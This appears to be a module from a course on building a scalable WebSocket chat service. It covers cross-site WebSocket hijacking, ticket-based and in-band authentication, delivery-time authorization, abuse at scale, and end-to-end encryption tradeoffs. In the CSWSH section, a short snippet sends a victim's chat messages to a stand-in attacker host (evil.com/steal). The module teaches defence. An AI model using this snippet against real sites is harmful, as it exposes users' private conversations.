# Module 21 — Security & Abuse at Scale

**Goal:** Close the security holes this course deliberately left open, and
understand the abuse problems that only exist at scale — including the E2EE
tradeoff that decides what your product can be.

⏱️ ~5 hours · **Prerequisites:** Modules 00–20.

---

## The holes we left open

This course has been accumulating deliberate debt. Here it is, collected:

| Module | Hole | Severity |
|--------|------|----------|
| 03 | `setAllowedOrigins("*")` on the raw WebSocket endpoint | **Critical** — CSWSH |
| 04 | `Authorization: user:alice` — a fake token, no verification | **Critical** |
| 04 | A token expires; the socket doesn't | High |
| 04 | Clients could publish directly to `/topic` (closed in the challenge) | Critical |
| 04 | No subscribe-time authorization (closed in the challenge) | High |
| 04 | Revocation gap: removed from a room, still subscribed | High |
| 11 | Rate limits exist, but nothing detects a distributed attack | Medium |
| 12 | No message content validation at all | Medium |
| 19 | Node name leaked to clients for routing | Low |

---

## CSWSH: the attack CORS doesn't stop

**Browsers do not apply CORS to WebSocket.** A `new WebSocket()` from
`evil.com` to `chat.example.com` is not blocked, and **cookies are sent**.

```html
<!-- on evil.com -->
<script>
const ws = new WebSocket('wss://chat.example.com/ws');   // cookies ride along
ws.onmessage = e => fetch('https://evil.com/steal', { method: 'POST', body: e.data });
</script>
```

If your server authenticates by cookie and doesn't check `Origin`, that page
reads the victim's entire chat.

```java
registry.addEndpoint("/ws")
        .setAllowedOrigins("https://chat.example.com");   // exact origins, never "*"
```

Two things to be precise about:

1. **`Origin` is set by the browser and cannot be forged by page JavaScript.** It
   is reliable against browser-based attacks. It is *not* reliable against a
   non-browser client (curl, a script), which can send anything — so `Origin` is
   a defense against CSWSH, not a general authorization mechanism.
2. **`SameSite=Lax` cookies (the modern default) already block this** for
   cross-site WebSocket. But you cannot rely on that alone: it depends on browser
   version and on nobody setting `SameSite=None` for an unrelated reason.

**Defense in depth: check `Origin`, use `SameSite=Strict`, and — best —
don't authenticate WebSockets by cookie at all.**

---

## Authenticating a WebSocket, properly

Module 04 listed the options. Here is the one Pulse ships and why.

| Approach | Problem |
|----------|---------|
| Cookie | CSWSH surface; cross-origin complications |
| `?token=<JWT>` | **Leaks into access logs, browser history, `Referer`, and error reports** |
| `Sec-WebSocket-Protocol` | Works; abuses a subprotocol field; limited character set |
| **Short-lived ticket in the query string** | ✅ single-use, 30-second life; a leaked log line is worthless |
| **Auth in the STOMP `CONNECT` frame** | ✅ never in a URL; costs one round trip |

Pulse uses **both**: a ticket to authorize the handshake (so an unauthenticated
socket never gets created), then the real JWT in the `CONNECT` frame.

```
POST /api/ws-ticket        (normal authenticated HTTP)
  → { ticket: "...", expiresIn: 30 }

wss://chat.example.com/ws?ticket=...
  → handshake authorized, socket opens
CONNECT
Authorization: Bearer <jwt>
  → session principal established
```

The ticket is single-use and stored in Redis with a 30-second TTL. A leaked
ticket in a log is expired and already consumed.

### The token that expires on a socket that doesn't

A JWT lives 15 minutes; a chat socket lives 8 hours. Three wrong answers and one
right one:

| Approach | Problem |
|----------|---------|
| Ignore it — authenticate once at connect | **A revoked user stays connected for hours** |
| Long-lived JWT (8 h) | A stolen token is valid for 8 hours |
| Drop the socket at expiry | Every user reconnects every 15 minutes; thundering herd, permanently |
| **In-band re-authentication** | ✅ Module 17 built this |

The server warns 2 minutes before expiry, the client refreshes over HTTP and
sends the new token on the open socket, and the session's expiry is updated in
place. **No reconnect, no gap, and revocation takes effect within one token
lifetime.**

For immediate revocation you need a **denylist** — a Redis set of revoked
`jti` values, checked on re-auth and pushed to every node via Pub/Sub.

---

## Authorization has two halves

Module 04's challenge established this and it's worth restating as a principle:

```
SUBSCRIBE time:  is this user allowed in this room?     ← necessary
DELIVERY time:   is this user STILL allowed?            ← the half people skip
```

A subscription is long-lived; a permission is not. Removing someone from a
private channel does not, by itself, stop delivering that channel's messages to
them — and that is a security bug, not a UX quirk.

Two mechanisms, and you want both:

1. **Active eviction on membership change** — synthesize an `UNSUBSCRIBE` on the
   broker (not just *ask* the client to unsubscribe; a hostile client won't), and
   publish the revocation over Redis so every node evicts.
2. **Re-check at delivery for sensitive rooms** — a cached membership lookup per
   delivered message. Real cost at fan-out scale, so apply it selectively.

---

## Abuse that only exists at scale

| Attack | Why scale matters | Defense |
|--------|-------------------|---------|
| **Connection flood** | 100k handshakes/s exhausts FDs before any message is sent | Rate-limit the handshake at the edge (nginx `limit_req`), not in the app |
| **Slow consumer (deliberate)** | One client can hold megabytes of your heap (Module 06) | `setSendBufferSizeLimit` — already done |
| **Large room amplification** | One message to a 50,000-member room is 50,000 deliveries | Room size caps; fan-out-on-read above a threshold |
| **Distributed low-and-slow** | 200 accounts each under every limit (Module 11) | Aggregate anomaly detection, not per-entity limits |
| **Resume abuse** | `fromSeq=0` on a 300k-message room is the most expensive request a client can make | Clamp, rate-limit, and abandon-threshold — Module 10 |
| **Zip-bomb payloads** | A 10 MB message × 200 recipients = 2 GB of buffers | `setMessageSizeLimit`, and validate *before* fan-out |
| **Account farming** | Rate limits are per-account; accounts are free | Registration friction, reputation, device fingerprinting |

The through-line: **limits scoped to one entity are bypassed by using many
entities.** You need per-entity limits *and* aggregate detection.

---

## Content validation, before fan-out

```java
@MessageMapping("/room.{roomId}/send")
public void send(@Payload @Valid MessageCreate create, ...) { }
```

`@Valid` runs after deserialization, which means Jackson has already parsed the
payload. For a 10 MB body that's 10 MB of heap before any check runs. The limit
must be **at the transport**:

```java
registration.setMessageSizeLimit(64 * 1024);      // Module 04
```

And validation must happen **before fan-out**, not after — a message that fails
validation must never be amplified 200×.

```
parse → validate → persist → publish → fan out
         ^^^^^^^^ here, once
```

---

## End-to-end encryption: the honest tradeoff

E2EE means the server cannot read messages. Everything below follows from that
one sentence.

**What you lose, concretely:**

| Capability | Without E2EE | With E2EE |
|-----------|-------------|-----------|
| Server-side search | ✅ | ❌ — client-side index only, over messages that device has |
| Content moderation | ✅ automated | ❌ — only user reports, or client-side scanning (contested) |
| Spam/abuse detection on content | ✅ | ❌ — metadata only |
| Link previews | ✅ server-side | client-side only, leaking the URL to the previewer |
| Push notification content | ✅ | ❌ — "New message" only, or client-side decryption in a notification extension |
| Multi-device | trivial | **hard** — key distribution, per-device sessions |
| New device sees history | ✅ | ❌ unless you ship an encrypted backup, which becomes the weak point |
| Server-side compliance/eDiscovery | ✅ | ❌ |
| Bots and integrations | ✅ | ❌ — a bot is another device needing keys |

**What you keep:** message delivery, ordering, presence, read receipts, and every
piece of infrastructure in this course. **E2EE is orthogonal to the fan-out
architecture** — the ciphertext routes exactly like plaintext.

**The metadata that leaks regardless:** who talked to whom, when, how often, from
what IP, message sizes, and timing. For many threat models that is the more
sensitive half.

> **The decision is a product decision, not a security one.** Signal's product
> *is* privacy, so E2EE is non-negotiable and search is client-side. Slack's
> product is searchable organizational memory, so E2EE would destroy it. Both are
> correct. What is *not* correct is adding E2EE without deciding what you're
> giving up — teams routinely ship it and then discover moderation is impossible.

Pulse ships **without E2EE by default**, with **crypto-shredding** (Module 12) for
GDPR erasure and **transport encryption everywhere**. The lab implements optional
E2EE for direct messages so the tradeoff is concrete rather than theoretical.

---

## What's next

The lab closes every hole in the table above, demonstrates CSWSH working and then
blocked, implements ticket + in-band re-auth with immediate revocation, builds
abuse detection that survives a distributed attack, and ships optional E2EE for
DMs — then measures what each defense costs.

See you in [`lab.md`](./lab.md).
